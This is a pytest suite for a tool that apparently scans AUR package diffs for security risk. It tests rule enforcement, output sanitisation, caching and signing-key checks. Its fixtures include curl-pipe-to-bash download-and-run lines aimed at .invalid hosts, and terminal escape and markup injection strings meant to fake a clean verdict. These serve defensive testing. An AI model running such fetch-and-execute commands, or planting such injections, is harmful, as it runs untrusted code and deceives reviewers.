"""The security model, tested.

``scripts/security_gates.py`` is the enforcement surface and CI runs it
whole.  This file runs it too, so a claim in ``docs/security-design/security-model.md`` cannot
break without a local ``pytest`` noticing, and adds the behavioural cases
the gates assert only the shape of.
"""

import io
import re
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))

from trustsight.analysis import scan_diff  # noqa: E402
from trustsight.config import (  # noqa: E402
    enforce_fatal_rules,
    shipped_rules,
)
from trustsight.coverage import (  # noqa: E402
    DIFF_TRUNCATED,
    INCOMPLETE_SUFFIX,
)
from trustsight.safe_text import clean, safe_markup  # noqa: E402
from trustsight.schema import PackageFact, ScoreEntry  # noqa: E402

HEADER = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n pkgname=demo\n pkgver=1.0\n"


_HOUR = 3600
@pytest.mark.parametrize("rid", ["R012", "R013"])
def test_a_deleted_fatal_rule_is_restored(rid):
    effective, restored = enforce_fatal_rules(
        [r for r in shipped_rules() if r["id"] != rid]
    )
    assert restored == [rid]
    assert any(r["id"] == rid and r["severity"] == "FATAL" for r in effective)


@pytest.mark.parametrize("rid", ["R012", "R013"])
def test_a_downgraded_fatal_rule_is_restored(rid):
    tampered = [
        dict(r, severity="INFO") if r["id"] == rid else r for r in shipped_rules()
    ]
    effective, restored = enforce_fatal_rules(tampered)
    assert restored == [rid]
    assert all(r["severity"] == "FATAL" for r in effective if r["id"] == rid)


def test_an_untouched_ruleset_is_left_alone():
    effective, restored = enforce_fatal_rules(shipped_rules())
    assert restored == []
    assert len(effective) == len(shipped_rules())


def test_a_user_added_rule_survives_enforcement():
    """Restoring a FATAL rule must not drop anything the operator added."""
    custom = {"id": "X999", "name": "local", "pattern": "zzz",
              "severity": "LOW", "category": "custom"}
    effective, _ = enforce_fatal_rules(
        [r for r in shipped_rules() if r["id"] != "R012"] + [custom]
    )
    assert any(r["id"] == "X999" for r in effective)


# --- output sanitisation --------------------------------------------------


@pytest.mark.parametrize("hostile", [
    "\x1b[2J\x1b[H",                  # clear screen, home cursor
    "\x1b]8;;http://evil.invalid\x07",  # OSC hyperlink
    "\x9b31m",                        # 8-bit CSI
    "demo\x00\x07\x7f",               # bare control bytes
    "line\nbreak\ttab",               # layout characters
])
def test_clean_removes_everything_a_terminal_acts_on(hostile):
    out = clean(hostile)
    assert not re.search(r"[\x00-\x08\x0b-\x1f\x7f-\x9f]", out)
    assert "\x1b" not in out


def test_clean_leaves_ordinary_text_alone():
    for ordinary in ("python-requests", "1.2.3-1", "usr/lib/systemd/system/x.service",
                     "Jörg Müller <j@example.org>"):
        assert clean(ordinary) == ordinary


def test_clean_truncates_on_request():
    assert clean("a" * 100, limit=10) == "a" * 9 + "…"


def test_safe_markup_neutralises_rich_tags():
    assert safe_markup("[bold red]CLEAN[/]") == r"\[bold red]CLEAN\[/]"


def test_an_unbalanced_tag_does_not_abort_the_render():
    """A MarkupError used to kill the render of every later package."""
    from rich.console import Console
    from rich.table import Table

    buffer = io.StringIO()
    console = Console(file=buffer, force_terminal=False, width=120)
    table = Table(show_header=False)
    table.add_column()
    table.add_row(safe_markup("[/not-a-tag"))
    console.print(table)
    assert "not-a-tag" in buffer.getvalue()


def test_a_hostile_package_cannot_repaint_the_review_table():
    from rich.console import Console

    import trustsight.cli.display as display
    import trustsight.cli.review as review

    hostile = "\x1b[2J[green]VERDICT: CLEAN[/]"
    results = [{
        "package": hostile, "old_version": "1.0", "new_version": "1.1",
        "score": 75, "verdict": hostile, "risk": "High", "first_seen": False,
        "coverage_gaps": [], "version_comparison": "", "aur_note": None,
        "findings": [{"rule_id": hostile, "file": hostile, "line": 1,
                      "description": hostile, "template": "", "evidence": {},
                      "severity": "HIGH", "weight": 25}],
        "file_changes": [{"path": hostile, "status": "added"}],
        "is_trivial": False,
    }]

    buffer = io.StringIO()
    saved = display._console
    display._console = Console(file=buffer, force_terminal=False, width=200)
    try:
        review._render_results_rich(results, 1, False, True, True, False)
    finally:
        display._console = saved

    out = buffer.getvalue()
    assert "\x1b" not in out
    assert "[green]" in out, "markup was interpreted rather than printed"


# --- the seed is not a control channel ------------------------------------


def test_a_seed_cannot_rewrite_the_database():
    from security_gates import gate_seed_cannot_rewrite_the_database

    gate = gate_seed_cannot_rewrite_the_database()
    assert gate.passed, gate.measured


# --- bounded work on hostile input ----------------------------------------


def test_rule_matching_clamps_its_input():
    from trustsight.rules import MAX_RULE_LINE_BYTES, clamp

    assert len(clamp("a" * (MAX_RULE_LINE_BYTES * 2))) == MAX_RULE_LINE_BYTES
    assert clamp("short") == "short"


def test_config_lists_are_data_not_patterns():
    """A host or port list entry with a metacharacter must not become regex."""
    from trustsight.config import _free_registrar_tld_pattern, _standard_port_pattern

    re.compile(_standard_port_pattern())
    re.compile(_free_registrar_tld_pattern())


def test_the_metadata_fetch_is_bounded():
    from trustsight.full_aur import metadata

    assert metadata.HTTP_TIMEOUT > 0
    assert metadata.MAX_RESPONSE_BYTES > 0
    assert metadata.MAX_DECOMPRESSED_BYTES > 0


# --- the memos must stay correct, not just fast ----------------------------


def test_memoised_lines_are_not_shared_between_callers():
    """Twenty call sites hold the result; one must not edit another's."""
    from trustsight.tokenizer import resolve_added_lines

    diff = HEADER + "+C=curl\n+$C https://x.invalid/s.sh | bash\n"
    first = resolve_added_lines(diff)
    first.append("INJECTED")
    first[0] = "CLOBBERED"
    second = resolve_added_lines(diff)
    assert "INJECTED" not in second
    assert second[0] != "CLOBBERED"


def test_memoised_classification_is_not_shared():
    from trustsight.rules import _classify_enclosing_function

    lines = ["+build() {", "+  curl x | bash", "+}"]
    first = _classify_enclosing_function(lines)
    first[999] = "INJECTED"
    assert 999 not in _classify_enclosing_function(lines)


def test_the_memo_distinguishes_different_diffs():
    """A two-entry cache must not answer for the wrong diff."""
    from trustsight.tokenizer import resolve_added_lines

    a = HEADER + "+A=wget\n+$A http://a.invalid\n"
    b = HEADER + "+A=curl\n+$A http://b.invalid\n"
    for _ in range(3):
        assert any("wget http://a.invalid" in ln for ln in resolve_added_lines(a))
        assert any("curl http://b.invalid" in ln for ln in resolve_added_lines(b))


def test_memoisation_is_per_thread():
    """A shared cache would hand one package's lines to another."""
    import threading

    from trustsight.tokenizer import resolve_added_lines

    results = {}

    def work(tag, marker):
        diff = HEADER + f"+X={marker}\n+$X run\n"
        for _ in range(20):
            got = resolve_added_lines(diff)
            results.setdefault(tag, set()).update(
                ln for ln in got if "run" in ln
            )

    threads = [threading.Thread(target=work, args=(i, f"m{i}")) for i in range(8)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    for tag, lines in results.items():
        assert lines == {f"+m{tag} run"}, f"thread {tag} saw {lines}"


def test_read_only_config_accessors_are_not_mutated():
    """load_toml(copy_result=False) is safe only while this holds."""
    import trustsight.config as config

    for accessor in (config.load_patterns, config.load_hosts, config.load_naming,
                     config.load_thresholds, config.load_iocs, config.load_domains):
        before = accessor()
        snapshot = repr(before)
        # A full analysis must leave every shared table exactly as it was.
        scan_diff(HEADER + "+curl https://x.invalid/s.sh | bash\n", package_name="p")
        assert repr(accessor()) == snapshot, f"{accessor.__name__} was mutated"


# --- defects found by audit, pinned so they cannot return -----------------


def test_dependency_changes_reach_the_change_summary():
    """B7's dependency row was dead twice over.

    `fact.dependency_changes` was never populated, and `summarise` read a
    `{op: names}` shape that `extract_dependency_changes` does not return
    (it returns `{field: {added names}}`). Adding a dependency produced no
    change entry at all.
    """
    diff = HEADER + "+depends=('qt6-svg' 'glibc')\n"
    fact = scan_diff(diff, package_name="demo")
    assert fact.dependency_changes, "dependency_changes was not populated"
    assert any(c.startswith("depends: ") for c in fact.changes), fact.changes
    entry = next(c for c in fact.changes if c.startswith("depends: "))
    assert "+qt6-svg" in entry and "+glibc" in entry


def test_declared_default_is_actually_used():
    """B10 promised a default subset with the rest under --verbose.

    `DECLARED_DEFAULT` existed and was referenced by nothing, so every
    declared practice rendered every time and the documented behaviour did
    not exist.
    """
    import inspect as _inspect

    import trustsight.cli.inspect as inspect_cli
    from trustsight.scoring import DECLARED_DEFAULT

    assert DECLARED_DEFAULT
    source = _inspect.getsource(inspect_cli)
    assert "DECLARED_DEFAULT" in source, "the default subset is never applied"


def test_the_declared_group_honours_verbose():
    from rich.console import Console

    import trustsight.cli.display as display
    import trustsight.cli.inspect as inspect_cli

    # A commit pin is the declared practice that renders unprompted (P005);
    # the checksums declared beside it are the one --verbose reveals (P001).
    # Before the commit-pin level existed, a checksum-pinned tarball was
    # mislabelled as a commit pin and supplied the visible half by accident.
    digest = "3b1f8a2c9d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8"
    diff = HEADER + (
        '+source=("https://github.com/d/d/files/stable.tar.gz" '
        '"git+https://github.com/d/d.git#commit=' + "a" * 40 + '")\n'
        f"+sha256sums=('{digest}' '{digest}')\n"
    )
    fact = scan_diff(diff, package_name="demo")

    def render(verbose):
        buffer = io.StringIO()
        saved = display._console
        display._console = Console(file=buffer, force_terminal=False, width=110)
        try:
            inspect_cli._inspect_rich(fact, verbose=verbose)
        finally:
            display._console = saved
        return buffer.getvalue()

    terse, full = render(False), render(True)
    assert "more declared practice(s)" in terse
    assert "more declared practice(s)" not in full
    # The suppressed ones really are absent, not merely uncounted.
    assert "checksums declared" not in terse
    assert "checksums declared" in full


def test_stored_rows_do_not_show_a_bare_band_for_an_incomplete_run():
    """B2 on the history and list surfaces.

    Both re-derived the band from the saved score with `risk_level`, which
    cannot express Inconclusive and knows nothing about coverage, so a run
    reported incomplete by `review` displayed a bare band afterwards.
    """
    import json

    from trustsight.scoring import stored_band

    row = {"final_score": 40, "fact_json": json.dumps(
        {"risk": "High", "coverage_gaps": [DIFF_TRUNCATED]})}
    label, complete = stored_band(row)
    assert label == "High" + INCOMPLETE_SUFFIX
    assert complete is False

    clean_row = {"final_score": 10, "fact_json": json.dumps(
        {"risk": "Low", "coverage_gaps": []})}
    assert stored_band(clean_row) == ("Low", True)

    # A row written before the field existed falls back honestly.
    assert stored_band({"final_score": 60})[0] == "High"


# --- B1 fingerprint / A14 / B9 structural ---------------------------------


def test_the_fingerprint_moves_only_with_the_instrument():
    import trustsight.config as config_module
    from trustsight.config import config_fingerprint

    first = config_fingerprint()
    assert first.startswith("sha256:")
    assert config_fingerprint() == first, "fingerprint is not stable"

    saved = config_module.load_thresholds
    config_module.load_thresholds = lambda: {"thresholds": {"probe": 1}}
    try:
        assert config_fingerprint() != first
    finally:
        config_module.load_thresholds = saved
    assert config_fingerprint() == first, "fingerprint did not return"


def test_the_report_carries_the_fingerprint():
    from trustsight.config import config_fingerprint
    from trustsight.schema import fact_to_dict

    fact = scan_diff(HEADER + "+pkgver=2\n", package_name="demo")
    assert fact_to_dict(fact)["config_fingerprint"] == config_fingerprint()


def test_inspect_json_carries_the_fingerprint_too():
    """B1 says *every* machine-readable report, not the ones that happened to.

    `inspect --json` went through a helper of its own that omitted the
    fingerprint while review --json and fact_to_dict carried it, so the
    guarantee was true of two paths out of three.  All three JSON surfaces
    now render through `report_body` (B11), so the fingerprint is checked
    there, with and without the score.
    """
    from trustsight.config import config_fingerprint
    from trustsight.reporting import evaluate_fact, report_body

    fact = scan_diff(HEADER + "+pkgver=2\n", package_name="demo")
    evaluated = evaluate_fact(fact)
    expected = config_fingerprint()
    assert report_body(evaluated)["config_fingerprint"] == expected
    assert report_body(evaluated, include_score=True)["config_fingerprint"] == expected


def test_a_suppression_survives_the_default_json(tmp_path, monkeypatch):
    """B5: no flag may hide a suppression.

    `suppressed_rules` rode along only under --verbose, so the default
    `review --json` made a switched-off rule indistinguishable from one that
    never matched.
    """
    import ast
    from pathlib import Path

    src = Path(__file__).resolve().parent.parent / "src" / "trustsight" / "cli" / "review.py"
    tree = ast.parse(src.read_text())
    for node in ast.walk(tree):
        if not isinstance(node, ast.If):
            continue
        test = ast.unparse(node.test)
        if "verbose" not in test and "quiet" not in test:
            continue
        for inner in ast.walk(node):
            assert not (isinstance(inner, ast.Constant)
                        and inner.value == "suppressed_rules"), (
                f"suppressed_rules is emitted under `if {test}` "
                f"at cli/review.py:{inner.lineno}"
            )


def test_the_shipped_baseline_key_is_pinned_and_valid():
    """A13: a real ed25519 distribution key is pinned (v0.12.0), so signed
    baseline import works.  The shipped file is 32 raw key bytes, not the old
    placeholder, and it loads without raising."""
    from trustsight.full_aur.export import (
        InvalidSignatureError,
        NoTrustedKeyError,
        _load_trusted_pubkey,
        _TRUSTED_PUBKEY_FILE,
    )

    # The two error types stay distinct: "no key pinned" must never be reported
    # as "your artifact is forged".
    assert not issubclass(NoTrustedKeyError, InvalidSignatureError)

    key = _load_trusted_pubkey(_TRUSTED_PUBKEY_FILE)
    assert len(key) == 32


def test_the_shipped_baseline_key_matches_the_documented_fingerprint():
    """A 32-byte key swap must not pass every gate but the doc's table."""
    import hashlib

    from trustsight.full_aur.export import _TRUSTED_PUBKEY_FILE

    raw = _TRUSTED_PUBKEY_FILE.read_bytes()
    fingerprint = "sha256:" + hashlib.sha256(raw).hexdigest()
    docs = (ROOT / "docs" / "reference" / "baseline-keys.md").read_text()
    assert fingerprint in docs
    assert raw.hex() in docs


def test_a_non_key_file_is_reported_as_no_pinned_key(tmp_path):
    """The placeholder detection is about length: a build that pins a non-key
    file refuses with NoTrustedKeyError rather than the forged-signature error
    that would accuse a good artifact."""
    import pytest as _pytest

    from trustsight.full_aur.export import NoTrustedKeyError, _load_trusted_pubkey

    not_a_key = tmp_path / "baseline_pubkey.pem"
    not_a_key.write_text("# instructions, not key bytes\n")
    with _pytest.raises(NoTrustedKeyError, match="No distribution key is pinned"):
        _load_trusted_pubkey(not_a_key)


def test_a_real_key_length_is_accepted(tmp_path):
    """The refusal is about length, so a genuine 32-byte key must pass it."""
    from trustsight.full_aur.export import _load_trusted_pubkey

    key = tmp_path / "pub.pem"
    key.write_bytes(b"\x01" * 32)
    assert _load_trusted_pubkey(key) == b"\x01" * 32


@pytest.mark.parametrize("case", [
    "first-seen", "first-seen-versions", "nothing-fired", "signals", "fatal",
])
def test_every_verdict_ends_with_a_direction(case):
    """B9 structurally: something present, not a phrasing absent."""
    from trustsight.schema import DiffSummary
    from trustsight.verdict import DIRECTIONS, fallback_verdict

    facts = {
        "first-seen": PackageFact(first_seen=True),
        "first-seen-versions": PackageFact(first_seen=True, old_version="1",
                                           new_version="2"),
        "nothing-fired": PackageFact(diff_summary=DiffSummary(files_changed=["PKGBUILD"])),
        "signals": PackageFact(
            diff_summary=DiffSummary(files_changed=["PKGBUILD"]),
            score_breakdown=[ScoreEntry(rule_id="R001", severity="HIGH", weight=25)]),
        "fatal": PackageFact(
            diff_summary=DiffSummary(files_changed=["PKGBUILD"]),
            score_breakdown=[ScoreEntry(rule_id="R012", severity="FATAL", weight=0)]),
    }
    assert fallback_verdict(facts[case]).rstrip().endswith(DIRECTIONS)


def test_a_package_named_safe_does_not_trip_the_denylist():
    """B9's denylist covers template text; field values are package-owned."""
    from security_gates import gate_no_template_grants_permission

    for name in ("safe-rs", "clean-arch", "nothing-to-review"):
        fact = scan_diff(HEADER + "+pkgver=2\n", package_name=name)
        assert fact.final_score == 0, name
    assert gate_no_template_grants_permission().passed


def test_every_input_bound_is_a_literal():
    from security_gates import gate_every_input_bound_is_a_source_constant

    gate = gate_every_input_bound_is_a_source_constant()
    assert gate.passed, gate.measured


def test_import_refuses_a_manifest_naming_another_key(tmp_path, monkeypatch):
    from trustsight.full_aur import export
    from trustsight.full_aur.export import InvalidSignatureError, import_baseline

    data = {
        "manifest": {
            "version": export._ARTIFACT_VERSION,
            "distribution_pubkey": "00" * 32,
        },
        "metadata_snapshot_hash": "",
        "profiles": [],
        "snapshots": [],
    }
    monkeypatch.setattr(export, "_read_artifact", lambda path: (data, b"sig"))
    monkeypatch.setattr(export, "verify_artifact", lambda *args, **kwargs: True)
    artifact = tmp_path / "baseline.tar.zst"
    artifact.write_bytes(b"x")
    with pytest.raises(InvalidSignatureError, match="different distribution key"):
        import_baseline(str(artifact))
